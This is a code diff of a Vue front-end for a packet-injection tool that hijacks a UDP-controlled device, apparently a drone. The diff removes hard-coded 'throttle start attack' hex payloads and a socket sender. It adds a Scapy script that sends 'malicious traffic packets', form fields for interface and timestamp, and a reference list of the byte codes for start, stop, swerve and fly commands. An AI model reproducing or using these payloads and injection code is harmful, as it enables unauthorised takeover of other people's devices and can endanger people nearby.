@@ -6,9 +6,9 @@
       </template>
 
       <a-form :layout="formLayout" :model="formState">
-        <a-row :gutter="24"> <!-- 设置列间距为 24 -->
+        <a-row :gutter="24">
           <!-- 左列 -->
-          <a-col :span="12"> <!-- 占据 12 列（即一半宽度） -->
+          <a-col :span="12">
             <a-form-item label="目标MAC地址">
               <a-input v-model:value="formState.dstMac" placeholder="请输入目标MAC地址 (dst_mac)" />
             </a-form-item>
@@ -18,10 +18,13 @@
             <a-form-item label="目标端口">
               <a-input v-model:value="formState.dstPort" placeholder="请输入目标端口 (dst_port)" />
             </a-form-item>
+            <a-form-item label="网卡名称">
+              <a-input v-model:value="formState.iface" placeholder="请输入网卡名称 (iface)" />
+            </a-form-item>
           </a-col>
 
           <!-- 右列 -->
-          <a-col :span="12"> <!-- 占据 12 列（即一半宽度） -->
+          <a-col :span="12">
             <a-form-item label="源MAC地址">
               <a-input v-model:value="formState.srcMac" placeholder="请输入源MAC地址 (src_mac)" />
             </a-form-item>
@@ -31,6 +34,32 @@
             <a-form-item label="源端口">
               <a-input v-model:value="formState.srcPort" placeholder="请输入源端口 (src_port)" />
             </a-form-item>
+            <a-form-item label="时间戳">
+              <a-input v-model:value="formState.timestamp" placeholder="请输入时间戳 (timestamp)" />
+            </a-form-item>
+          </a-col>
+        </a-row>
+
+        <!-- 新增指令输入行 -->
+        <a-row :gutter="24">
+          <a-col :span="24">
+            <a-form-item label="指令参数（逗号分隔两个字节）">
+              <a-input
+                v-model:value="formState.instruct"
+                placeholder="示例：b3,31（自动转换为['b3','31']）"
+                @change="(val: string) => formState.instruct = val.split(',')"
+              />
+            </a-form-item>
+
+            <a-alert
+              message="指令参考"
+              type="info"
+              show-icon
+              :description="`
+                start1: b3,31 ———— start2: ff,7d ———— stop: 00,82 ———— swerve: 01,02 ———— fly1: b3,32 ———— fly2: ff,7d`
+              "
+              style="margin-bottom: 16px"
+            />
           </a-col>
         </a-row>
       </a-form>
@@ -88,14 +117,10 @@ import { executeStartHijack } from '@/api/executeStartHijack.ts';
 import type { GetPacketParams } from '@/utils/types'
 import { useTrafficHexStore } from '@/stores/useTrafficHexStore.ts'
 import { useTrafficHexStore2 } from '@/stores/useTrafficHexStore2.ts'
-import { getPacket } from '@/api/getPacket.ts'
-import { sendPacket } from '@/api/sendPacket.ts'
+import { getCustomPacket } from '@/api/getCustomPacket.ts'
+import { sendCustomPacket } from '@/api/sendCustomPacket.ts'
 
 const formLayout = 'vertical'; // 设置表单布局
-
-// 油门启动攻击流量
-const trafficData1 = "ef0258000202000100000000d5000000140066148080b38000020000000000000000000031990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000";
-const trafficData2 = "ef0258000202000100000000d7000000140066148080ff800002000000000000000000007d990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000";
 
 // 获取流量pinia对象
 const trafficHexStore = useTrafficHexStore();
@@ -106,10 +131,12 @@ const defaultValues = ref<GetPacketParams>({
   dstMac: 'b8:3d:fb:5d:7e:ef', // 目标MAC地址
   dstIp: '192.168.169.1',      // 目标IP
   dstPort: 8800,               // 目标端口
-  srcMac: '12:34:56:78:9a:bc', // 源MAC地址
+  srcMac: 'f4:6d:3f:28:6e:64', // 源MAC地址
   srcIp: '192.168.169.2',      // 源IP
-  srcPort: 12345,               // 源端口
-  trafficHex: { trafficData1, trafficData2 }
+  srcPort: 51669,               // 源端口
+  iface: 'WLAN',               // 网卡名称
+  timestamp: "0100",              // 时间戳
+  instruct: ["b3", "31"]         // 指令
 });
 
 // 创建一个对象来存储表单的状态
@@ -120,7 +147,9 @@ const formState = ref<GetPacketParams>({
   srcMac: '',
   srcIp: '',
   srcPort: 0,
-  trafficHex: { trafficData1, trafficData2 }
+  iface: '',
+  timestamp: '',
+  instruct: []
 });
 
 // 创建一个方法来重置表单状态为初始值
@@ -128,11 +157,19 @@ const resetToDefaults = () => {
   formState.value = defaultValues.value;
 };
 
-const pythonCode = ref( `import socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 创建原始套接字
-sock.sendto(traffic1, (dst_ip, dst_port)) # 发送恶意流量包
-sock.sendto(traffic2, (dst_ip, dst_port))
-sock.close() # 关闭套接字
+const pythonCode = ref( `from scapy.all import *
+# 构造链路层 (Ethernet)
+ether_layer = Ether(src=local_mac, dst=dst_mac)
+# 构造 IP 层
+ip_layer = IP(src=src_ip, dst=dst_ip)
+# 构造 UDP 层
+udp_layer = UDP(sport=src_port, dport=dst_port)
+# 构造负载 (Raw 层)
+payload = Raw(load=data_hex)
+# 构造二层流量包
+packet = ether_layer / ip_layer / udp_layer / payload
+# 发送恶意流量包
+sendp(packet, iface=iface, verbose=0)
 `);
 
 onMounted(() => {
@@ -152,8 +189,8 @@ const handleClickMakeTraffic = async () => {
     // 设置按钮加载状态为 true
     isLoadingMakeTraffic.value = true;
 
-    // 调用 getPacket 接口
-    const response = await getPacket(formState.value);
+    // 调用 getCustomPacket 接口
+    const response = await getCustomPacket(formState.value);
     console.log(response);
 
     // 获取 data 对象中的所有字符串值
@@ -166,7 +203,7 @@ const handleClickMakeTraffic = async () => {
 
     // 设置流量内容
     trafficHexStore.setTrafficHex(stringValues[0]);
-    trafficHexStore2.setTrafficHex2(stringValues[1]);
+    trafficHexStore2.setTrafficHex2("");
 
   } catch (error) {
     // 处理错误
@@ -189,7 +226,8 @@ const handleClickAttack = async () => {
     }
 
     // 调用 executeStartHijack 接口
-    const response = await sendPacket({
+    const response = await sendCustomPacket({
+      iface: formState.value.iface,
       packet: trafficHex
     });
 
